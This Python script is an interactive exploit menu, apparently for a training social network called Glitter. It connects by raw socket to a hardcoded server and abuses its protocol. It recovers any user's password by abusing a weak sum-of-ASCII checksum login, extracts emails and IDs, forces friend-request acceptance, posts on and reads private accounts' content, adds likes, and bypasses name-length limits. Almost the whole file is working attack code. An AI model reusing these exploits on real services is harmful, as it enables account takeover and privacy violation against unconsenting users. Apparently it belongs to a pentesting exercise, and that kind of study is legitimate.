from datetime import datetime, timezone
import socket

#Constants
GLITTER_IP = "44.224.228.136"
GLITTER_PORT = 80
PRIVATE_GLIT_ID = "95440"
LIKE_GLIT_ID = "90834"

#All actions will be done on / from this account, you may change it to your liking
default_user_name = "DummyTestPage"
default_password = "123"
default_id = "52859"

def create_sock():
    #function creates socket with gliiter, then returns it to be used
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (GLITTER_IP, GLITTER_PORT)
    sock.connect(server_address)
    return sock

def login(sock):
    #Function logs in to glitter with a socket
    sock.sendall(('100#{gli&&er}{"user_name":"' + default_user_name + '","password":"' + default_password + '","enable_push_notifications":true}##').encode())
    server_msg = sock.recv(1024)
    checksum = str(calculate_checksum(default_user_name + default_password))
    sock.sendall(('110#{gli&&er}' + checksum + '##').encode())
    server_msg = sock.recv(1024)

def logout(sock):
    #Function logs out of glitter with a socket
    sock.sendall(('200#{gli&&er}' + default_id + '##').encode())

def like_post():
    #Function likes glit
    try:
        sock = create_sock()
        login(sock) #You will see this line in most functions here, since in order to actually do stuff in glitter you have to be logged in.
        sock.sendall(('710#{gli&&er}{"glit_id":' + LIKE_GLIT_ID + ',"user_id":' + default_id + ',"user_screen_name":"","id":-1}##').encode())
        server_msg = sock.recv(1024)
        logout(sock) #This one too!
        sock.close()
    except Exception as e:
        print(e)

def extract_field(server_msg, field):
    field_index = server_msg.find(field)
    start = field_index + len(field)
    end = start
    while server_msg[end] != '"' and server_msg[end] != ',' and server_msg[end] != '{':
        end += 1
    field_value = server_msg[start:end]
    return field_value

def get_id(name):
    #Function searches a user and gets its id
    try: #All functions will be wrapped aroung a try except, you can never know what problems the server will have so it's safer than leaving it unchecked
        sock = create_sock()
        login(sock)
        id_value = ""
        sock.sendall(('300#{gli&&er}{"search_type":"SIMPLE","search_entry":"' + str(name) + '"}##').encode())
        server_msg = sock.recv(1024).decode()
        if "id" not in server_msg:
            print("Wrong username, maybe try full name name?")
            id_value = None
        else:
            id_value = extract_field(server_msg, '"id":')
        logout(sock)
        sock.close()
        return id_value
    except Exception as e:
        print(e)
        return None

def get_email(name):
    #Function searches a user and gets its email
    try:
        sock = create_sock()
        login(sock)
        email_value = ""
        sock.sendall(('300#{gli&&er}{"search_type":"SIMPLE","search_entry":"' + str(name) + '"}##').encode())
        server_msg = sock.recv(1024).decode()
        if "mail" not in server_msg:
            print("Wrong username, maybe try full name name?")
            email_value = None
        else:
            email_value = extract_field(server_msg, '"mail":"')
        logout(sock)
        sock.close()
        return email_value
    except Exception as e:
        print(e)
        return None

def get_password(name):
    #Function sends a message to the server to login with a user, then entering a password that matches the required checksum
    try:
        sock = create_sock()
        #No reason to login here since were not performing any action that requires it
        sock.sendall(('100#{gli&&er}{"user_name":"' + name + '","password":"X","enable_push_notifications":true}##').encode())
        server_msg = sock.recv(1024).decode()
        if "User doesn't exist" not in server_msg:
            checksum = int(extract_field(server_msg, 'checksum: '))
            diff = checksum - calculate_checksum(name) #The difference in the checksums is the password
            fake_pass = chr(diff)
            sock.sendall(('100#{gli&&er}{"user_name":"' + name + '","password":"' + str(fake_pass) + '","enable_push_notifications":true}##').encode())
            server_msg = sock.recv(1024).decode()
            sock.sendall(("110#{gli&&er}" + str(checksum) + "##").encode())
            server_msg = sock.recv(1024).decode()

            password = extract_field(server_msg, '"password":"')
            return password
        else:
            print("Wrong username")

        sock.close()
    except Exception as e:
        print(e)
        return None

def calculate_checksum(string):
    #Function calculates checksum
    #The checksum is the sum of every character converted into ascii.
    total = 0
    for char in string:
        total += ord(char)
    return total

def special_color_post(message, box_color, font_color):
    #Function uploads a post with special colors
    try:
        sock = create_sock()
        login(sock)
        date = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z" #Pretty sure this isn't required, but without it I had some problems so it's better than nothing.
        sock.sendall(('550#{gli&&er}{"feed_owner_id":' + default_id + ',"publisher_id":' + default_id + ',"publisher_screen_name":"","publisher_avatar":"im5","background_color":"' + box_color + '","date":"' + date + '","content":"' + str(message) + '","font_color":"' + font_color + '","id":-1}##').encode())
        server_msg = sock.recv(1024).decode()
        print(server_msg)
        logout(sock)
        sock.close()
    except Exception as e:
        print(e)

def accept_request(sender_id, target_id):
    #Functions accepts a friend request between 2 user ids
    try:
        sock = create_sock()
        login(sock)
        sock.sendall(('420#{gli&&er}[' + sender_id + ',' + target_id + ']##').encode())
        print(sock.recv(1024).decode())
        logout(sock)
        sock.close()
    except Exception as e:
        print(e)

def comment(message):
    #Function posts a comment on a glit (Even private ones!)
    try:
        sock = create_sock()
        login(sock)
        date = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"  #Again, good practice
        sock.sendall(('650#{gli&&er}{"glit_id":' + PRIVATE_GLIT_ID + ',"user_id":' + default_id + ',"user_screen_name":"' + default_user_name + '","id":-1,"content":"' + message + '","date":"' + date + '"}##').encode())
        print(sock.recv(1024).decode())
        logout(sock)
        sock.close()
    except Exception as e:
        print(e)

def change_user_name(new_user_name):
    #Function updates a user's screen name (name)
    try:
        sock = create_sock()
        login(sock)
        sock.sendall(('350#{gli&&er}{"screen_name":"' + new_user_name + '","avatar":"im8","description":"ds","privacy":"Public","id":' + default_id + ',"user_name":"' + default_user_name + '","password":"' + default_password + '","gender":"Male","mail":"guy@gmail.com"}##').encode())
        print(sock.recv(1024).decode())
        logout(sock)
        sock.close()
    except Exception as e:
        print(e)

def create_account(screen_name, username, password):
    #Function creates a new account
    try:
        sock = create_sock()
        sock.sendall(('150#{gli&&er}{"registration_code":"12345","user":{"screen_name":"' + screen_name + '","avatar":"im1","description":"dsa","privacy":"Public","id":-1,"user_name":"' + username + '!","password":"' + password + '","gender":"Male","mail":"1234@dsddad.cds"}}##').encode())
        print(sock.recv(1024).decode())
        sock.close()
    except Exception as e:
        print(e)

def get_feed(user_id):
    #Function "loads up" an account's page, and by doing so gets its feed
    try:
        sock = create_sock()
        login(sock)
        sock.sendall(('500#{gli&&er}{"feed_owner_id":' + user_id + ',"end_date":"2025-06-19T16:58:48.112Z","glit_count":5}##').encode()) #Only last 5 glits
        response = sock.recv(32768).decode() #Window size needs to be large since an account with a lot of glits can return large amounts of bytes
        start_index = 0
        while True:
            start_index = response.find('"content":"', start_index)
            if start_index == -1:
                break
            start_index += len('"content":"')
            end_index = response.find('"', start_index)
            content = response[start_index:end_index]
            print(content)
            start_index = end_index + 1
        logout(sock)
        sock.close()
    except Exception as e:
        print(e)

#def test():

def main():
    print("Welcome to glitter's pentesting hub!")
    while True:
        print("Enter Choice:\n1. Add likes\n2. Get user's id\n3. Get user's email\n4. Get user's password\n5. Publish special colored glit\n6. Force request accept\n7. Reply private glit\n"
              "8. Update user name\n9. Create account with long name\n10. Get account's feed")
        try:
            choice = int(input())
            if choice == 1:
                like_post()
                print("Like added! check out DummyTestPage's 'LIKES GLIT' post for the result.\n")
            elif choice == 2:
                name = input("Enter target user:")
                id = get_id(name)
                print(f"ID is: {id}")
            elif choice == 3:
                name = input("Enter target user:")
                email = get_email(name)
                print(f"Email is: {email}")
            elif choice == 4:
                username = input("Enter account's username (not full name):")
                password = get_password(username)
                print(f"Password is: {password}")
            elif choice == 5:
                message = input("Enter message:")
                box_color = input("Enter special color: (Blue, Black, Grey...)")
                font_color = input("Enter font color: (Blue, Black, Grey...)")
                special_color_post(message, box_color, font_color)
            elif choice == 6:
                print("In order for this to succeed, you must first send a glance request to someone and know their id, or you can send to " + default_user_name)
                sender_id = input("Enter your account's id (if you don't know it use command number 2 ;)): ")
                target_id = input('Enter your target id (Or if you sent to the default account use ' + default_id + ')')
                accept_request(sender_id, target_id)
            elif choice == 7:
                print('This will send a reply to a glit in the account "SecretPrivateAccount" by ' + default_user_name + ','
                'In order for you to see the result, you will have to be friends with SecretPrivateAccount,\nso use command number 6 with target id 54472.')
                opt = input("Do you want to continue? y for yes / anything else for no: \n")
                if opt == 'y':
                    message = input("Enter message")
                    comment(message)
            elif choice == 8:
                print("This option will change the username of " + default_user_name + ", so make sure you change"
                    "\nit back for future uses")
                new_user_name = input("Enter new long username: ")
                change_user_name(new_user_name)
            elif choice == 9:
                print("This option creates a user with a name longer than the restricted length in the app.\nBeware that every input has to be longer than 5 characters.\n")
                screen_name = input("Enter screen name: ")
                username = input("Enter account's username: ")
                password = input("Enter your password: ")
                create_account(screen_name, username, password)
            elif choice == 10:
                print("This option can show you the feed of a private account.\n(You can use 54472, the id of SecretPrivateAccount.)")
                account_id = input("Enter account ID: ")
                get_feed(account_id)
            else:
                print("No such option..")
        except ValueError:
            print("Enter a valid choice!")

if __name__ == "__main__":
    main()
